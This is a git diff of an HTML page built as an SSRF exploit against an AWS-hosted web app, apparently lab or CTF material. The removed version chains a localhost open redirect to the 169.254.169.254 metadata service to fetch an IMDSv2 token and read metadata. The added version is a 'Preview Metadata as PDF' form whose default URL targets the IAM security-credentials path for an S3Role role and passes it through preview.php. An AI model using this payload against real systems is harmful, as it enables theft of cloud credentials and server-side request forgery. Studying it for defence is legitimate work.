@@ -1,36 +1,89 @@
-<html>
-  <h1>Hey there!</h1>
-  <div id="tokenResult"></div>
-  <div id="metaDataResult"></div>
-  <div id="errorMsg"></div>
-  <script>
-    const tokenEndpoint = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
-    const metadataEndpoint = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
-
-    const tokenDiv = document.getElementById("tokenResult");
-    const metadataDiv = document.getElementById("metaDataResult");
-    const errorDiv = document.getElementById("errorMsg");
-
-    let token = "";
-
-    try {
-      const xhr = new XMLHttpRequest();
-
-      // בקשת הטוקן
-      xhr.open("PUT", tokenEndpoint, false);
-      xhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
-      xhr.send();
-      token = xhr.responseText;
-      tokenDiv.innerHTML = `<b>Token:</b> ${token}`;
-
-      // בקשת המטא-דאטה עם הטוקן
-      xhr.open("GET", metadataEndpoint, false);
-      xhr.setRequestHeader("X-aws-ec2-metadata-token", token);
-      xhr.send();
-      metadataDiv.innerHTML = `<b>Metadata:</b><br>${xhr.responseText.replace(/\n/g, "<br>")}`;
-
-    } catch (e) {
-      errorDiv.innerHTML = `<b>Error:</b> ${e.message}`;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Metadata Preview to PDF</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+      background: #f0f0f0;
     }
+    label, input, button {
+      font-size: 1rem;
+    }
+    #resultFrame {
+      margin-top: 20px;
+      width: 100%;
+      height: 600px;
+      border: 1px solid #ccc;
+      display: none;
+    }
+    #errorMsg {
+      color: red;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Preview Metadata as PDF</h1>
+  
+  <form id="previewForm">
+    <label for="metadataUrl">Enter metadata URL:</label><br />
+    <input type="text" id="metadataUrl" name="url" 
+           value="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role" 
+           size="80" required />
+    <button type="submit">Generate PDF</button>
+  </form>
+
+  <div id="errorMsg"></div>
+
+  <!-- iframe to show PDF or preview -->
+  <iframe id="resultFrame"></iframe>
+
+  <script>
+    const form = document.getElementById('previewForm');
+    const iframe = document.getElementById('resultFrame');
+    const errorMsg = document.getElementById('errorMsg');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      errorMsg.textContent = '';
+      iframe.style.display = 'none';
+
+      const url = form.url.value.trim();
+      if (!url) {
+        errorMsg.textContent = 'Please enter a valid URL';
+        return;
+      }
+
+      try {
+        // שולח בקשה ל־preview.php עם הפרמטר url
+        const response = await fetch('/preview.php?url=' + encodeURIComponent(url));
+
+        if (!response.ok) {
+          throw new Error('Server returned status ' + response.status);
+        }
+
+        const contentType = response.headers.get('Content-Type');
+
+        if (contentType === 'application/pdf') {
+          // מראה את ה-PDF ב-iframe
+          const blob = await response.blob();
+          const blobUrl = URL.createObjectURL(blob);
+          iframe.src = blobUrl;
+          iframe.style.display = 'block';
+        } else {
+          // אם זה טקסט או JSON, מציג מתחת לטופס
+          const text = await response.text();
+          errorMsg.textContent = 'Response is not a PDF:\n' + text;
+        }
+      } catch (err) {
+        errorMsg.textContent = 'Error: ' + err.message;
+      }
+    });
   </script>
+
+</body>
 </html>
